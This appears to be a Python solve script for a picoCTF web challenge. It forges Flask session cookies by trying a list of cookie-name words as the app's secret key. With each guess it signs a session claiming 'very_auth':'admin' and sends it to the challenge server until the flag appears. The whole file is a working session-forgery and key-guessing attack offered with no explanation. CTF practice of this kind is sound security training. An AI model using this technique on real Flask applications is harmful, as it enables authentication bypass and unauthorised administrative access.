import requests
import sys
import zlib
from itsdangerous import base64_encode, base64_decode
import ast
from flask.sessions import SecureCookieSessionInterface

cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz",
                "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

cookie = "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YFFdSA.LbYkYrpXFGFev6L6-Q3DP-noPuw"


class MockApp(object):

    def __init__(self, secret_key):
        self.secret_key = secret_key


def encode(secret_key, session_cookie_structure):
    """ Encode a Flask session cookie """
    try:
        app = MockApp(secret_key)

        session_cookie_structure = dict(
            ast.literal_eval(session_cookie_structure))
        si = SecureCookieSessionInterface()
        s = si.get_signing_serializer(app)

        return s.dumps(session_cookie_structure)
    except Exception as e:
        return "[Encoding error] {}".format(e)
        raise e


def decode(session_cookie_value, secret_key=None):
    """ Decode a Flask cookie  """
    try:
        if(secret_key == None):
            compressed = False
            payload = session_cookie_value

            if payload.startswith('.'):
                compressed = True
                payload = payload[1:]

            data = payload.split(".")[0]

            data = base64_decode(data)
            if compressed:
                data = zlib.decompress(data)

            return data
        else:
            app = MockApp(secret_key)

            si = SecureCookieSessionInterface()
            s = si.get_signing_serializer(app)

            return s.loads(session_cookie_value)
    except Exception as e:
        return "[Decoding error] {}".format(e)
        raise e


payload = "{'very_auth':'admin'}"
url = "http://mercury.picoctf.net:53700/display"


for key in cookie_names:
    new_cookie = encode(key, payload)
    print("trying key{}".format(key))
    r = requests.get(
        url, cookies={"session": new_cookie}, allow_redirects=False)
    if("picoCTF" in r.text):
        print(r.text.split("<code>")[1].split("</code>")[0])
        break
